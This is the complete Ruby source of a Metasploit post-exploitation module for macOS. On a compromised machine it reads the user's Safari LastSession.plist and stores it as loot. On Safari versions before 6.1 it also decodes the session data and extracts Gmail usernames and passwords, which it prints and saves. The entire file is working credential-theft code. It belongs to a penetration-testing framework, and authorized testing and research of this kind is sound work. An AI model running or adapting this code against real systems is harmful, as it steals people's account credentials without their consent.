##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'OSX Gather Safari LastSession.plist',
      'Description'   => %q{
        This module downloads the LastSession.plist file from the target machine. 
        LastSession.plist is used by Safari to track active websites in the current session,
        and sometimes contains sensitive information such as usernames and passwords.

        This module will first download the original LastSession.plist, and then attempt
        to find the credential for Gmail. The Gmail's last session state may contain the
        user's credential if his/her first login attempt failed (likely due to a typo),
        and then the page got refreshed or another login attempt was made. This also means
        the stolen credential might contains typos.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sinn3r'],
      'Platform'      => [ 'osx' ],
      'SessionTypes'  => [ 'shell' ],
      'References'    =>
        [
          ['URL', 'http://www.securelist.com/en/blog/8168/Loophole_in_Safari']
        ]
    ))
  end


  #
  # Returns the Safari version based on version.plist
  # @return [String] The Safari version. If not found, returns ''
  #
  def get_safari_version
    vprint_status("#{peer} - Checking Safari version.")
    version = ''

    f = read_file("/Applications/Safari.app/Contents/version.plist")
    xml = REXML::Document.new(f) rescue nil
    return version if xml.nil?

    xml.elements['plist/dict'].each_element do |e|
      if e.text == 'CFBundleShortVersionString'
        version = e.next_element.text
        break
      end
    end

    version
  end

  def peer
    "#{session.session_host}:#{session.session_port}"
  end


  #
  # Converts LastSession.plist to xml, and then read it
  # @param filename [String] The path to LastSession.plist
  # @return [String] Returns the XML version of LastSession.plist
  #
  def plutil(filename)
    cmd_exec("plutil -convert xml1 #{filename}")
    read_file(filename)
  end


  #
  # Returns the XML version of LastSession.plist (text file)
  # Just a wrapper for plutil
  #
  def get_lastsession
    print_status("#{peer} - Looking for LastSession.plist")
    plutil("#{expand_path("~")}/Library/Safari/LastSession.plist")
  end


  #
  # Returns the <array> element that contains session data
  # @param lastsession [String] XML data
  # @return [REXML::Element] The Array element for the session data
  #
  def get_sessions(lastsession)
    session_dict = nil

    xml = REXML::Document.new(lastsession) rescue nil
    return nil if xml.nil?

    xml.elements['plist'].each_element do |e|
      found = false
      e.elements.each do |e2|
        if e2.text == 'SessionWindows'
          session_dict = e.elements['array']
          found = true
          break
        end
      end

      break if found
    end

    session_dict
  end


  #
  # Returns the <dict> session element
  # @param xml [REXML::Element] The array element for the session data
  # @param domain [Regexp] The domain to search for
  # @return [REXML::Element] The <dict> element for the session data
  #
  def get_session_element(xml, domain_regx)
    dict = nil

    found = false
    xml.each_element do |e|
      e.elements['array/dict'].each_element do |e2|
        if e2.text =~ domain_regx
          dict = e
          found = true
          break
        end
      end

      break if found
    end

    dict
  end


  #
  # Extracts Gmail username/password
  # @param xml [REXML::Element] The array element for the session data
  # @return [Array] [0] is the domain, [1] is the user, [2] is the pass
  #
  def find_gmail_cred(xml)
    vprint_status("#{peer} - Looking for username/password for Gmail.")
    gmail_dict = get_session_element(xml, /(mail|accounts)\.google\.com/)
    return '' if gmail_dict.nil?

    raw_data = gmail_dict.elements['array/dict/data'].text
    decoded_data = Rex::Text.decode_base64(raw_data)
    cred = decoded_data.scan(/Email=(.+)&Passwd=(.+)\&signIn/).flatten
    user, pass = cred.map {|data| Rex::Text.uri_decode(data)}

    return '' if user.blank? or pass.blank?

    ['mail.google.com', user, pass]
  end

  #
  # Runs the module
  #
  def run
    cred_tbl = Rex::Ui::Text::Table.new({
      'Header'  => 'Credentials',
      'Indent'  => 1,
      'Columns' => ['Domain', 'Username', 'Password']
    })

    #
    # Downloads LastSession.plist in XML format
    #
    lastsession = get_lastsession
    if lastsession.blank?
      print_error("#{peer} - LastSession.plist not found")
      return
    else
      p = store_loot('osx.lastsession.plist', 'text/plain', session, lastsession, 'LastSession.plist.xml')
      print_good("#{peer} - LastSession.plist stored in: #{p.to_s}")
    end

    #
    # If this is an unpatched version, we try to extract creds
    #
    version = get_safari_version
    if version.blank?
      print_warning("Unable to determine Safari version, will try to extract creds anyway")
    elsif version >= "6.1"
      print_status("#{peer} - This machine no longer stores session data in plain text")
      return
    else
      vprint_status("#{peer} - Safari version: #{version}")
    end

    #
    # Attempts to convert the XML file to an actual XML object, with the <array> element
    # holding our session data
    #
    lastsession_xml = get_sessions(lastsession)
    unless lastsession_xml
      print_error("Cannot read XML file, or unable to find any session data")
      return
    end

    #
    # Look for credential in the session data.
    # I don't know who else stores their user/pass in the session data, but I accept pull requests.
    # Already looked at hotmail, yahoo, and twitter
    #
    gmail_cred = find_gmail_cred(lastsession_xml)
    cred_tbl << gmail_cred unless gmail_cred.blank?

    unless cred_tbl.rows.empty?
      p = store_loot('osx.lastsession.creds', 'text/plain', session, cred_tbl.to_csv, 'LastSession_creds.txt')
      print_good("#{peer} - Found credential saved in: #{p}")
      print_line
      print_line(cred_tbl.to_s)
    end
  end

end
